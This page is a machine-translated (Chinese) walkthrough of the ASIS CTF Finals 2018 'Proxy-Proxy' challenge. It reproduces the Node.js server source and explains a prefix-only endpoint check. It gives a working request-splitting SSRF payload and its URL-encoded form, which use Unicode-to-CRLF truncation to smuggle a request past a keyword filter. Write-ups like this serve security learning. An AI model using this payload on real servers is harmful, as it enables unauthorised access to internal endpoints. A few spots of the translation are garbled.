<html>
<head>
<title>NodeJS SSRF by Response Splitting — ASIS CTF Finals 2018 — Proxy-Proxy Question Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">NodeJS SSRF通过响应分裂-ASIS CTF总决赛2018-代理-代理问题演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501?source=collection_archive---------2-----------------------#2018-11-26">https://infosecwriteups.com/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501?source=collection_archive---------2-----------------------#2018-11-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="9e64" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">大家好，这个故事是关于2018年ASIS CTF总决赛参与者的“代理-代理”问题。问题是从这样一页开始的:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/6a276f286fa1b99971981cd628ec8058.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vQiA5t2LCuTJvoZKKv_YQw.jpeg"/></div></div></figure><p id="9dbf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下端点可用:</p><ol class=""><li id="ea43" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">/proxy/internal _ website/public _ notes</li><li id="9e43" class="kx ky iq jp b jq lg ju lh jy li kc lj kg lk kk lc ld le lf bi translated">/proxy/internal _ web站点/public_links</li><li id="6554" class="kx ky iq jp b jq lg ju lh jy li kc lj kg lk kk lc ld le lf bi translated">/标志</li></ol><p id="1ea5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">显然，前两个没有用，最后一个有消息:<code class="fe ll lm ln lo b">forbidden</code></p><p id="85b3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">随便放一个词和URL的结尾，透露(/proxy/internal_website/blah):</p><pre class="km kn ko kp gt lp lo lq lr aw ls bi"><span id="d32f" class="lt lu iq lo b gy lv lw l lx ly">Undefined endpoint, available endpoints are: ["<strong class="lo ir">public_notes</strong>","<strong class="lo ir">public_links</strong>","<strong class="lo ir">source_code</strong>"]</span></pre><p id="03b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">发现的源代码:</p><pre class="km kn ko kp gt lp lo lq lr aw ls bi"><span id="f7aa" class="lt lu iq lo b gy lv lw l lx ly">const express = require('express');<br/>const fs = require('fs');<br/>const path = require('path');<br/>const body_parser = require('body-parser');<br/>const md5 = require('md5');<br/>const http = require('http');<br/>var ip = require("ip");<br/>require('x-date');<br/>var server_ip = ip.address() const server = express();<br/>server.use(body_parser.urlencoded({<br/>    extended: true<br/>}));<br/>server.use(express.static('public')) server.set('views', path.join(__dirname, 'views'));<br/>server.set('view engine', 'jade');<br/>server.listen(5000) server.get('/', function(request, result) {<br/>    result.render('index');<br/>    result.end()<br/>})<br/>function check_endpoint(available_endpoints, endpoint) {<br/>    for (i of available_endpoints) {<br/>        if (endpoint.indexOf(i) == 0) {<br/>            return true;<br/>        }<br/>    }<br/>    return false;<br/>}<br/>fs.readFile('flag.dat', 'utf8', function(err, contents) {<br/>    if (err) {<br/>        throw err;<br/>    }<br/>    flag = contents;<br/>}) server.get('/proxy/internal_website/:page', function(request, result) {<br/>    var available_endpoints = ['public_notes', 'public_links', 'source_code']<br/>    var page = request.params.page result.setHeader('X-Node-js-Version', 'v8.12.0') result.setHeader('X-Express-Version', 'v4.16.3') if (page.toLowerCase().includes('flag')) {<br/>        result.sendStatus(403) result.end()<br/>    } else if (!check_endpoint(available_endpoints, page)) {<br/>        result.render('available_endpoints', {<br/>            endpoints: JSON.stringify(available_endpoints)<br/>        }) result.end()<br/>    } else {<br/>        http.get('<a class="ae lz" href="http://127.0.0.1:5000/'" rel="noopener ugc nofollow" target="_blank">http://127.0.0.1:5000/'</a> + page, function(res) {<br/>            res.setEncoding('utf8');<br/>            if (res.statusCode == 200) {<br/>                res.on('data', function(chunk) {<br/>                    result.render('proxy', {<br/>                        contents: chunk<br/>                    }) result.end()<br/>                });<br/>            } else if (res.statusCode == 404) {<br/>                result.render('proxy', {<br/>                    contents: 'The resource not found.'<br/>                }) result.end()<br/>            } else {<br/>                result.end()<br/>            }<br/>        }).on('error', function(e) {<br/>            console.log("Got error: " + e.message);<br/>        });<br/>    }<br/>}) server.use(function(request, result, next) {<br/>    ip = request.connection.remoteAddress<br/>    if (ip.substr(0, 7) == "::ffff:") {<br/>        ip = ip.substr(7)<br/>    }<br/>    if (ip != '127.0.0.1' &amp;&amp; ip != server_ip) {<br/>        result.render('unauthorized') result.end()<br/>    } else {<br/>        next()<br/>    }<br/>}) server.get('/public_notes', function(request, result) {<br/>    result.render('public_notes');<br/>    result.end()<br/>}) server.get('/public_links', function(request, result) {<br/>    result.render('public_links');<br/>    result.end()<br/>}) server.get('/source_code', function(request, result) {<br/>    fs.readFile('server.js', 'utf8', function(err, contents) {<br/>        if (err) {<br/>            throw err;<br/>        }<br/>        result.render('source_code', {<br/>            source: contents<br/>        }) result.end()<br/>    })<br/>}) server.get('/flag/:token', function(request, result) {<br/>    var token = request.params.token<br/>    if (token.length &gt; 10) {<br/>        console.log(ip) fs.writeFile('public/temp/' + md5(ip + token), flag, (err) =&gt; {<br/>            if (err) throw err;<br/>            result.end();<br/>        });<br/>    }<br/>}) server.get('/', function(request, result) {<br/>    result.render('index');<br/>    result.end()<br/>}) server.get('*', function(req, result) {<br/>    result.sendStatus(404);<br/>    result.end()<br/>});</span></pre><p id="697d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">分析:</p><ol class=""><li id="12b1" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">唯一可以从外部执行的路径是<strong class="jp ir">/proxy/internal _ website/:page</strong></li><li id="c82c" class="kx ky iq jp b jq lg ju lh jy li kc lj kg lk kk lc ld le lf bi translated">只有3个端点可以通过代理调用。</li></ol><pre class="km kn ko kp gt lp lo lq lr aw ls bi"><span id="4cea" class="lt lu iq lo b gy lv lw l lx ly">var available_endpoints = ['public_notes', 'public_links', 'source_code']</span></pre><p id="41be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.根据代码，对于可用的端点，只检查变量的开头。</p><pre class="km kn ko kp gt lp lo lq lr aw ls bi"><span id="def9" class="lt lu iq lo b gy lv lw l lx ly">if (endpoint.indexOf(i) == 0) {</span></pre><p id="d61f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">4.<code class="fe ll lm ln lo b">page</code>变量不能有单词<code class="fe ll lm ln lo b">flag</code>，考虑到代码，它不能被绕过:</p><pre class="km kn ko kp gt lp lo lq lr aw ls bi"><span id="d187" class="lt lu iq lo b gy lv lw l lx ly">page.toLowerCase().includes('flag')</span></pre><p id="0b34" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">5.端点<strong class="jp ir"> /flag/:token </strong>保存包含标志的文件。</p><p id="7212" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">6.根据代码，没有一个端点是可直接调用的。</p><pre class="km kn ko kp gt lp lo lq lr aw ls bi"><span id="75fd" class="lt lu iq lo b gy lv lw l lx ly">if (ip != '127.0.0.1' &amp;&amp; ip != server_ip) {<br/>    result.render('unauthorized') result.end()<br/>} else {<br/>    next()<br/>}</span></pre><p id="a52a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我必须通过代理向端点<code class="fe ll lm ln lo b">/flag/:token</code>发送一个HTTP请求。然而，它不在可用的端点中，而且<code class="fe ll lm ln lo b">flag</code>这个词是被禁止的。乍看起来似乎不可能，但是NodeJS的版本容易受到SSRF的攻击。代码中的提示:</p><pre class="km kn ko kp gt lp lo lq lr aw ls bi"><span id="a27e" class="lt lu iq lo b gy lv lw l lx ly">result.setHeader('X-Node-js-Version', 'v8.12.0') result.setHeader('X-Express-Version', 'v4.16.3')</span></pre><p id="1094" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">易受攻击的代码:</p><pre class="km kn ko kp gt lp lo lq lr aw ls bi"><span id="429f" class="lt lu iq lo b gy lv lw l lx ly">http.get('<a class="ae lz" href="http://127.0.0.1:5000/'" rel="noopener ugc nofollow" target="_blank">http://127.0.0.1:5000/'</a> + page, function(res) {</span></pre><p id="8556" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">关于漏洞的文章(仔细阅读，我省略了对漏洞的描述):</p><pre class="km kn ko kp gt lp lo lq lr aw ls bi"><span id="5603" class="lt lu iq lo b gy lv lw l lx ly"><a class="ae lz" href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/" rel="noopener ugc nofollow" target="_blank">https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/</a></span></pre><p id="8a27" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，以下有效负载导致发送两个单独的HTTP请求，第一个发送到<code class="fe ll lm ln lo b">/public_notes</code>端点，第二个发送到<code class="fe ll lm ln lo b">/flag/irgeeksssrf</code>，这导致将<code class="fe ll lm ln lo b">flag</code>保存在<code class="fe ll lm ln lo b">/temp/</code>文件夹中的名称<code class="fe ll lm ln lo b">md5(127.0.0.1irgeesssrf</code>内:</p><pre class="km kn ko kp gt lp lo lq lr aw ls bi"><span id="b6f2" class="lt lu iq lo b gy lv lw l lx ly">public_notes\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0166}\u{016c}\u{0161}\u{0167}/irgeeksirgeeks</span></pre><p id="6eb9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最终URL:</p><pre class="km kn ko kp gt lp lo lq lr aw ls bi"><span id="80b4" class="lt lu iq lo b gy lv lw l lx ly">/proxy/internal_website/public_notes%C4%A0HTTP%2F1.1%C4%8D%C4%8AHost%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2F%C5%A6%C5%AC%C5%A1%C5%A7%2Firgeeksirgeeks</span></pre><p id="3ec8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">注意:</strong>端点是<code class="fe ll lm ln lo b">public_notes</code>，正如分析中提到的，我们可以扩展端点，因为只检查了端点的开始。</p><p id="0081" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">注意:</strong>以下Unicode被翻译成<code class="fe ll lm ln lo b">flag</code>并绕过条件<code class="fe ll lm ln lo b">.includes('flag')</code>:</p><pre class="km kn ko kp gt lp lo lq lr aw ls bi"><span id="6ceb" class="lt lu iq lo b gy lv lw l lx ly">\u{0166}\u{016c}\u{0161}\u{0167}<br/>666c6167 = flag</span></pre><p id="60c1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">旗帜是ASIS。</p></div></div>    
</body>
</html>